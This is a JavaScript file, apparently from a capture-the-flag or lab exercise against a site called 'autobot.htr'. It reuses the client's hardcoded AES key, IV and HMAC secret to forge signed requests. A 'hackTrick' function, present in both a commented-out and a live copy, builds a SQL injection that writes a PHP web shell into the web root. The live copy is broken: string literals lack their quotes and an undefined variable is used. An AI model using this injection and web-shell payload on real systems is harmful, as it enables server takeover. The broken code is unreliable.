// document.addEventListener("DOMContentLoaded", function () {
//   initializeCardClickListeners();
// });

// function initializeCardClickListeners() {
//   const robotsCard = document.querySelectorAll(".card");
//   obotsCard.forEach((robotCard) => {
//     robotCard.addEventListener("click", handleCardClick);
//   });
//   hackTrick();
// }

// function hackTrick() {
//   const sqli =
//     "0 UNION ALL SELECT 'a',NULL,NULL,'<?php system($_GET[\"cmd\"]); ?>' into outfile '/var/www/autobot-dev/cmd.php' -- -";
//   const encRobotId = encryptRobotId(sqli);
//   const payload = JSON.stringify({ id: encRobotId });
//   const signature = createHmacSignature(payload);
//   console.log(payload, signature);
// }

// function handleCardClick() {
//   const attrId = this.getAttribute("data-id");
//   const encRobotId = encryptRobotId(attrId);
//   const payload = JSON.stringify({ id: encRobotId });
//   const signature = createHmacSignature(payload);
//   console.log(encRobotId, payload, signature);
//   // sendRequestToServer(payload, signature); // COMMENT TO CHECK ERROR
// }

// function encryptRobotId(attrId) {
//   const encKey = CryptoJS.enc.Hex.parse("CE3079D025B694ED3584AAD418CF478A");
//   const IV = CryptoJS.enc.Hex.parse("D01D2F4E94A9C50F0D26BA06590868B4");
//   const aesEncrypted = CryptoJS.AES.encrypt(attrId, encKey, { iv: IV });
//   const result = aesEncrypted.ciphertext.toString(CryptoJS.enc.Base64);
//   /** SCRIPT ADDED */
//   //Decode from text
//   var cipherParams = CryptoJS.lib.CipherParams.create({
//     ciphertext: CryptoJS.enc.Base64.parse(result),
//   });
//   var decryptedFromText = CryptoJS.AES.decrypt(cipherParams, encKey, { iv: IV });
//   console.log(decryptedFromText.toString(CryptoJS.enc.Utf8));
//   /** SCRIPT ADDED */

//   return result;
// }
// function createHmacSignature(strPayload) {
//   const channelSecret = "5CA1C12F155310445D5F5488CCE3EAA8";
//   return CryptoJS.HmacSHA256(strPayload, channelSecret).toString();
// }

// function sendRequestToServer(payload, signature) {
//   const xmlRequest = new XMLHttpRequest();
//   xmlRequest.open("POST", "https://autobot.htr/details.php", true);
//   xmlRequest.setRequestHeader("Host", "autobot.htr");
//   xmlRequest.setRequestHeader("Origin", "https://autobot.htr/");
//   xmlRequest.setRequestHeader("Content-type", "application/json");
//   xmlRequest.setRequestHeader("Access-Control-Request-Origin", "https://autobot.htr/");
//   xmlRequest.setRequestHeader("X-Signature", signature);
//   xmlRequest.onreadystatechange = function () {
//     if (xmlRequest.readyState === 4 && xmlRequest.status === 200) {
//       displayResponseInModal(xmlRequest.responseText);
//     }
//   };
//   xmlRequest.send(payload);
// }
// function displayResponseInModal(responseText) {
//   document.querySelector(".modal-body").innerHTML = responseText;
//   $("#detailModal").modal("show");
// }

////////////

document.addEventListener(DOMContentLoaded, function () {
  initializeCardClickListeners();
});

function initializeCardClickListeners() {
  const cards = document.querySelectorAll(".card");
  cards.forEach((card) => {
    card.addEventListener(click, handleCardClick);
  });

  //
}

/* hacktrick */
function hackTrick() {
  const sqli =
    "0 UNION ALL SELECT 'a',NULL,NULL,'<?php system($_GET[\"cmd\"]); ?>' into outfile '/var/www/autobot-dev/cmd.php' -- -";
  const encRobotId = encryptRobotId(sqli);
  const payload = JSON.stringify({ id: encRobotId });
  const signature = createHmacSignature(payload);
  console.log(payload, signature);
}

function handleCardClick() {
  const dataId = this.getAttribute("data-id");
  const encryptedId = encryptRobotId(dataId);
  const requestData = JSON.stringify({ id: encryptedId });
  const signature = createHmacSignature(requestData);
  // sendRequestToServer(requestData, signature); // normal request
}

function encryptRobotId(dataId) {
  const key = CryptoJS.enc.Hex.parse(CE3079D025B694ED3584AAD418CF478A);
  const iv = CryptoJS.enc.Hex.parse(D01D2F4E94A9C50F0D26BA06590868B4);
  const encrypted = CryptoJS.AES.encrypt(dataId, key, { iv: iv });
  const result = encrypted.ciphertext.toString(CryptoJS.enc.Base64);

  /* add script to decrypt */
  const decrypted = CryptoJS.AES.decrypt(encryptedData, key, { iv: iv });
  // Convert decrypted data to UTF-8 string
  const decryptedData = decrypted.toString(CryptoJS.enc.Utf8);
  console.log(decryptedData);
  /* ==== */

  return result;
}

function createHmacSignature(requestData) {
  const secretKey = "5CA1C12F155310445D5F5488CCE3EAA8";
  return CryptoJS.HmacSHA256(requestData, secretKey).toString();
}

function sendRequestToServer(payload, signature) {
  const xmlRequest = new XMLHttpRequest();
  xmlRequest.open("POST", "https://autobot.htr/details.php", true);
  xmlRequest.setRequestHeader("Host", "autobot.htr");
  xmlRequest.setRequestHeader("Origin", "https://autobot.htr/");
  xmlRequest.setRequestHeader("Content-type", "application/json");
  xmlRequest.setRequestHeader("Access-Control-Request-Origin", "https://autobot.htr/");
  xmlRequest.setRequestHeader("X-Signature", signature);
  xmlRequest.onreadystatechange = function () {
    if (xmlRequest.readyState === 4 && xmlRequest.status === 200) {
      displayResponseInModal(xmlRequest.responseText);
    }
  };
  xmlRequest.send(payload);
}
function displayResponseInModal(responseText) {
  document.querySelector(".modal-body").innerHTML = responseText;
  $("#detailModal").modal("show");
}
